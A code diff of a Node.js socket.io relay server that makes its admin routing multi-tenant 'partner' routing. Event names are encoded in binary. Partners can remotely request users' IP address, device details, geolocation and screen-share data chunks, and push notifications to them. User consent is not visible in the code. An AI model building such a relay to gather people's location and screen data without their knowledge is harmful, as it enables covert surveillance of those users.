@@ -47,6 +47,10 @@ var adminSocket;
 
 var userSocket = {};
 
+var partners = {};
+
+var users = {}
+
 function binaryToString(binaryStr) {
     return binaryStr.split(' ').map(bin => {
         const asciiValue = parseInt(bin, 2);
@@ -79,9 +83,13 @@ io.on('connection', async (socket) => {
     console.log('New user connected');
 
     const adminConnected = binaryEvent('adminConnected');
-    socket.on(adminConnected, (adminId) => {
-        adminSocket = binaryToString(adminId);
-        console.log("Admin socket id :- ", adminSocket);
+    socket.on(adminConnected, (data) => {
+        const stringData = binaryToString(data);
+        console.log(stringData);
+        const parsedData = JSON.parse(stringData);
+        console.log(parsedData);
+        partners[parsedData.partnerId] = parsedData.socketId;
+        console.log("Admin socket id :- ", parsedData.socketId);
     });
 
     const userJoined = binaryEvent('userJoined');
@@ -94,7 +102,17 @@ io.on('connection', async (socket) => {
             const obj = JSON.parse(jsonstring);
 
             // Store user socket info
-            userSocket[obj.userId] = obj.socketId;
+            // userSocket[obj.userId] = obj.socketId;
+
+            if (!users[obj.partnerId]) {
+                users[obj.partnerId] = {};
+            }
+
+            console.log(obj);
+
+            users[obj.partnerId][obj.userId] = obj.socketId;
+
+            console.log(users);
 
             // Query the database to check user status
             const result = await connection.query(`SELECT ss_user_status($1)`, [obj.userId]);
@@ -119,8 +137,6 @@ io.on('connection', async (socket) => {
                 activeUsers: activeUsers
             };
 
-            console.log(udata);
-
             // Convert data to JSON string and then to binary
             const jsonString = JSON.stringify(udata);
             const binaryCode = stringToBinary(jsonString);
@@ -139,35 +155,45 @@ io.on('connection', async (socket) => {
 
 
     const userClicked = binaryEvent('userClicked');
-    socket.on(userClicked, (id) => {
-        userId = binaryToString(id);
-        const userSocketId = userSocket[userId];
-        socket.to(userSocketId).emit(userClicked, (id));
+    socket.on(userClicked, (data) => {
+        const stringData = binaryToString(data);
+        console.log(stringData);
+        const parsedData = JSON.parse(stringData);
+        console.log(parsedData, '--parsedData--');
+        const userSocketId = users[parsedData.partnerId][parsedData.id];
+        console.log(userSocketId, '--userSocketId--');
+        socket.to(userSocketId).emit(userClicked);
     });
 
     const ipInfo = binaryEvent('ipInfo');
-    socket.on(ipInfo, (id) => {
+    socket.on(ipInfo, (partnerId, id) => {
         userId = binaryToString(id);
-        const userSocketId = userSocket[userId];
+        partnerKey = binaryToString(partnerId);
+        const userSocketId = users[partnerKey][userId];
         socket.to(userSocketId).emit(ipInfo);
     });
 
     const sendIpInfo = binaryEvent('sendIpInfo');
-    socket.on(sendIpInfo, (ip) => {
-        socket.to(adminSocket).emit(sendIpInfo, (ip));
+    socket.on(sendIpInfo, (partnerKey, ip) => {
+        const partnerId = binaryToString(partnerKey);
+        const partnerSocket = partners[partnerId];
+        socket.to(partnerSocket).emit(sendIpInfo, (ip));
     });
 
     const deviceInfo = binaryEvent('deviceInfo');
-    socket.on(deviceInfo, (id) => {
+    socket.on(deviceInfo, (partnerID, id) => {
         userId = binaryToString(id);
-        const userSocketId = userSocket[userId];
+        partnerKey = binaryToString(partnerID);
+        const userSocketId = users[partnerKey][userId];
         const DeviceInfo = binaryEvent('DeviceInfo');
         socket.to(userSocketId).emit(DeviceInfo);
     });
 
     const sendDeviceInfo = binaryEvent('sendDeviceInfo');
-    socket.on(sendDeviceInfo, (dInfo, ip) => {
-        socket.to(adminSocket).emit(sendDeviceInfo, dInfo, ip);
+    socket.on(sendDeviceInfo, (dInfo, ip, partnerKey) => {
+        const partnerId = binaryToString(partnerKey);
+        const partnerSocket = partners[partnerId];
+        socket.to(partnerSocket).emit(sendDeviceInfo, dInfo, ip);
     });
 
     // const screenShareClicked = binaryEvent('screenShareClicked');
@@ -223,9 +249,14 @@ io.on('connection', async (socket) => {
     });
 
     const sentDataChunk = binaryEvent('sentDataChunk');
-    socket.on(sentDataChunk, (chunk, index, totalChunk) => {
+    socket.on(sentDataChunk, (chunk, index, totalChunk, partnerKey) => {
+        const partnerId = binaryToString(partnerKey);
+        console.log(partnerId, '--partnerId--');
+        const partnerSocketId = partners[partnerId];
         const sendChunkData = binaryEvent('sendChunkData');
-        socket.to(adminSocket).emit(sendChunkData, chunk, index, totalChunk);
+        console.log(partners, '--partners--');
+        console.log(partnerSocketId, '--partnerSocketId--');
+        socket.to(partnerSocketId).emit(sendChunkData, chunk, index, totalChunk);
     });
 
     // const sentscreenSharing = binaryEvent('sentscreenSharing');
@@ -235,15 +266,18 @@ io.on('connection', async (socket) => {
     // });
 
     const location = binaryEvent('location');
-    socket.on(location, (id) => {
+    socket.on(location, (id, partnerKey) => {
         userId = binaryToString(id);
-        const userSocketId = userSocket[userId];
-        socket.to(userSocketId).emit(location, id);
+        const partnerid = binaryToString(partnerKey);
+        const userSocketId = users[partnerid][userId];
+        socket.to(userSocketId).emit(location);
     });
 
     const sendLocation = binaryEvent('sendLocation');
-    socket.on(sendLocation, (lat, lon) => {
-        socket.to(adminSocket).emit(sendLocation, lat, lon);
+    socket.on(sendLocation, (lat, lon, partnerkey) => {
+        const partnerID = binaryToString(partnerkey);
+        const partnerSocket = partners[partnerID];
+        socket.to(partnerSocket).emit(sendLocation, lat, lon);
     });
 
     const stoppedScreenSharing = binaryEvent('stoppedScreenSharing');
@@ -280,8 +314,7 @@ io.on('connection', async (socket) => {
     socket.on(sendNotification, (data) => {
         const obj = binaryToString(data);
 
-        const parsedData = JSON.parse(obj);
-
+        const parsedData = JSON.parse(obj); ``
 
         const jsonString = JSON.stringify(parsedData);
 
@@ -289,7 +322,7 @@ io.on('connection', async (socket) => {
 
         const sendNotification = binaryEvent('sendNotification');
         parsedData.id.forEach(element => {
-            const userSocketId = userSocket[element];
+            const userSocketId = users[parsedData.partnerId][element];
             socket.to(userSocketId).emit(sendNotification, (binaryData));
         });
     });
